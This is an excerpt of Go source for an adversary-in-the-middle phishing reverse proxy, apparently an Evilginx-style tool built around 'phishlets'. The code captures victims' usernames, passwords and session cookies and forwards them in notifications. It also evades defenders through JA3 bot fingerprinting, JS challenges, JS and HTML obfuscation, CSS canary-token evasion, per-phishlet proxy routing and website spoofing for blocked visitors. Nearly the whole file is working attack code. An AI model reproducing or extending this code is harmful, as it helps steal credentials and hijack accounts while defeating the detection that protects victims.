...
type HttpProxy struct {
	...
	sids              map[string]int
	ja3Cache          map[string]string // remote_addr -> JA3 hash
	ja3Mtx            sync.RWMutex
	cookieName        string
	last_sid          int
	developer         bool
...
// proxyCtxKey is the context key used to pass a named proxy to the Transport.
type proxyCtxKey struct{}

// proxyForRequest returns the proxy URL for an outgoing request.
// It checks for a per-request named proxy (set via context in the request handler),
// then falls back to the global proxy configuration.
func (p *HttpProxy) proxyForRequest(req *http.Request) (*url.URL, error) {
	// Check for per-request named proxy from context
	if name, ok := req.Context().Value(proxyCtxKey{}).(string); ok && name != "" {
		np, err := p.cfg.GetNamedProxy(name)
		if err == nil && np.Address != "" {
			return buildProxyURL(np.Type, np.Address, np.Port, np.Username, np.Password), nil
		}
	}

	// Fall back to global proxy
	if p.cfg.proxyConfig.Enabled {
		pc := p.cfg.proxyConfig
		return buildProxyURL(pc.Type, pc.Address, pc.Port, pc.Username, pc.Password), nil
	}

	return nil, nil // direct connection
}

// buildProxyURL constructs a proxy URL from the given parameters.
func buildProxyURL(ptype, address string, port int, username, password string) *url.URL {
	u := &url.URL{
		Scheme: ptype,
...
func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
	p := &HttpProxy{
		...
		notifier:          NewNotificationManager(cfg),
		apiServer:         NewApiServer(cfg, db),
	...
	// Set up per-request proxy routing (supports global proxy + named per-phishlet proxies)
	p.Proxy.Tr.Proxy = p.proxyForRequest
	p.Proxy.Tr.Dial = nil // let Transport.Proxy handle all proxy routing

	if cfg.proxyConfig.Enabled {
		log.Info("enabled proxy: " + cfg.proxyConfig.Address + ":" + strconv.Itoa(cfg.proxyConfig.Port))
	}

	// Log named proxy count
	if len(cfg.GetNamedProxies()) > 0 {
		log.Info("loaded %d named proxy profile(s)", len(cfg.GetNamedProxies()))
	}
	...
	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		...
		if p.apiServer.HandleApiRequest(w, req) {
			return
		}
	...
	p.Proxy.OnRequest().
		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
			...
			// Inject native JA3 fingerprint from TLS handshake into request header
			if p.cfg.IsBotguardEnabled() {
				p.ja3Mtx.RLock()
				if ja3, ok := p.ja3Cache[from_ip]; ok {
					req.Header.Set("X-JA3-Fingerprint", ja3)
				}
				p.ja3Mtx.RUnlock()
			}

			// Botguard: check for bot-like behavior
			if p.botguard.IsBot(req) {
				if p.cfg.IsBotguardJsChallengeEnabled() {
					// Serve JS challenge page
					challengeHtml := p.botguard.GetChallengeHTML(req)
					resp := goproxy.NewResponse(req, "text/html", http.StatusOK, challengeHtml)
					if resp != nil {
						return req, resp
					}
				}
				...
				if len(ra) >= 3 {
					...
					if strings.HasSuffix(js_id, ".js") {
						...
						if s, ok := p.sessions[session_id]; ok {
							...
							if err == nil {
								script = p.obfuscator.ObfuscateJS(script, p.cfg.GetJsObfuscationLevel())
								d_body += script + "\n\n"
							} else {
					...
					if strings.HasSuffix(session_id, ".js") {
						...
						if !s.IsDone {
							if s.RedirectURL != "" {
								...
								dynamic_redirect_js = p.obfuscator.ObfuscateJS(dynamic_redirect_js, p.cfg.GetJsObfuscationLevel())
			...
			// Set per-request proxy based on phishlet configuration
			if ps.PhishletName != "" {
				proxyName := p.cfg.PhishletConfig(ps.PhishletName).Proxy
				if proxyName != "" {
					req = req.WithContext(context.WithValue(req.Context(), proxyCtxKey{}, proxyName))
				}
			}
		...
		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
			...
			if is_cookie_auth && is_body_auth && is_http_auth {
				...
				if s, ok := p.sessions[ps.SessionId]; ok {
					if !s.IsDone {
						...
						// Notify: session captured
						p.notifier.Notify(&NotificationEvent{
							Type:       EVENT_SESSION_CAPTURED,
							SessionId:  ps.Index,
							Phishlet:   s.Name,
							Username:   s.Username,
							Password:   s.Password,
			...
			if err == nil {
				for site, pl := range p.cfg.phishlets {
					...
					// CSS canary token evasion: unescape CSS url() blocks before applying sub_filters
					if stringExists(mime, []string{"text/css", "text/html"}) {
						body = unescapeCssUrls(body)
					}
				...
				if stringExists(mime, []string{"text/html"}) {
					...
					// HTML obfuscation
					if p.cfg.IsHtmlObfuscationEnabled() {
						body = p.obfuscator.ObfuscateHTML(body)
					}
				}
...
func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
	...
	// Website spoofing: reverse-proxy the unauth_url content instead of redirecting
	if p.cfg.IsSpoofEnabled() {
		spoof_url := p.cfg.GetSpoofUrl()
		if spoof_url == "" {
			spoof_url = redirect_url
		}
		if spoof_url != "" {
			return p.spoofWebsite(req, spoof_url)
		}
	}
...
func (p *HttpProxy) spoofWebsite(req *http.Request, target_url string) (*http.Request, *http.Response) {
	spoofCache.mtx.Lock()
	defer spoofCache.mtx.Unlock()

	// Use cached content if fresh (5 minute TTL)
	if spoofCache.url == target_url && len(spoofCache.body) > 0 && time.Since(spoofCache.fetched) < 5*time.Minute {
		resp := goproxy.NewResponse(req, spoofCache.mime, http.StatusOK, string(spoofCache.body))
		if resp != nil {
			return req, resp
		}
		return req, nil
	...
	fetch_req, err := http.NewRequest("GET", target_url, nil)
	if err != nil {
		log.Debug("spoof: failed to create request: %v", err)
		return p.javascriptRedirect(req, target_url)
	}
	fetch_req.Header.Set("User-Agent", req.Header.Get("User-Agent"))
	fetch_req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	fetch_req.Header.Set("Accept-Language", "en-US,en;q=0.5")

	fetch_resp, err := client.Do(fetch_req)
	if err != nil {
		log.Debug("spoof: failed to fetch URL: %v", err)
		return p.javascriptRedirect(req, target_url)
	}
	defer fetch_resp.Body.Close()

	body, err := ioutil.ReadAll(fetch_resp.Body)
	if err != nil {
		log.Debug("spoof: failed to read response: %v", err)
		return p.javascriptRedirect(req, target_url)
	}

	mime := "text/html"
	ct := fetch_resp.Header.Get("Content-Type")
	if ct != "" {
		mime = ct
	}
	...
	if u != nil {
		...
		// Rewrite relative href/src attributes to absolute
		body_str := string(body)
		body_str = strings.ReplaceAll(body_str, "href=\"/", "href=\""+base_url+"/")
		body_str = strings.ReplaceAll(body_str, "src=\"/", "src=\""+base_url+"/")
		body_str = strings.ReplaceAll(body_str, "href='/", "href='"+base_url+"/")
		body_str = strings.ReplaceAll(body_str, "src='/", "src='"+base_url+"/")
		body_str = strings.ReplaceAll(body_str, "action=\"/", "action=\""+base_url+"/")
		body_str = strings.ReplaceAll(body_str, "action='/", "action='"+base_url+"/")
		body = []byte(body_str)
	}

	// Cache the response
	spoofCache.body = body
	spoofCache.mime = mime
	spoofCache.url = target_url
	spoofCache.fetched = time.Now()

	log.Debug("spoof: cached content from %s (%d bytes)", target_url, len(body))
...
func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
	...
	for _, v := range vals {
		...
		// Try AES-256-GCM decryption first (version byte 0x02)
		raw_data, err := base64.RawURLEncoding.DecodeString(v[0])
		if err == nil && len(raw_data) > 1 && raw_data[0] == 0x02 {
			aes_key := p.cfg.GetEncKey()
			if aes_key != "" && len(aes_key) >= 32 {
				dec_data, err := aesGcmDecrypt([]byte(aes_key[:32]), raw_data[1:])
				if err == nil {
					params, err := url.ParseQuery(string(dec_data))
					if err == nil {
						for kk, vv := range params {
							log.Debug("param (aes): %s='%s'", kk, vv[0])
					...
					log.Debug("extractParams: aes decryption failed: %s", err)
				}
			}
		}

		// Fallback: RC4 decryption (legacy)
		if len(v[0]) > 8 {
			enc_key := v[0][:8]
...
func (p *HttpProxy) setSessionPassword(sid string, password string) {
	...
	if ok {
		...
		// Notify: credential captured
		s_index, _ := p.sids[sid]
		p.notifier.Notify(&NotificationEvent{
			Type:       EVENT_CREDENTIAL_CAPTURED,
			SessionId:  s_index,
			Phishlet:   s.Name,
			Username:   s.Username,
			Password:   password,
...
func (p *HttpProxy) httpsWorker() {
	...
	for p.isRunning {
		...
		go func(c net.Conn) {
			...
			// Extract JA3 fingerprint from the ClientHello
			if tlsConn.ClientHelloMsg != nil {
				extensions := ParseExtensionTypes(tlsConn.ClientHelloMsg.Raw)
				ja3Hash, _ := ComputeJA3(
					tlsConn.ClientHelloMsg.Vers,
					tlsConn.ClientHelloMsg.CipherSuites,
					extensions,
					tlsConn.ClientHelloMsg.SupportedCurves,
					tlsConn.ClientHelloMsg.SupportedPoints,
				)
				if ja3Hash != "" {
					remoteAddr := strings.SplitN(c.RemoteAddr().String(), ":", 2)[0]
					p.ja3Mtx.Lock()
					p.ja3Cache[remoteAddr] = ja3Hash
					p.ja3Mtx.Unlock()
				}
			}
...
func (p *HttpProxy) Start() error {
	go p.httpsWorker()
	go p.ja3CacheCleanup()
	return nil
}

// ja3CacheCleanup periodically clears the JA3 cache to prevent memory growth.
func (p *HttpProxy) ja3CacheCleanup() {
	ticker := time.NewTicker(10 * time.Minute)
	for range ticker.C {
		p.ja3Mtx.Lock()
		p.ja3Cache = make(map[string]string)
		p.ja3Mtx.Unlock()
	}
}
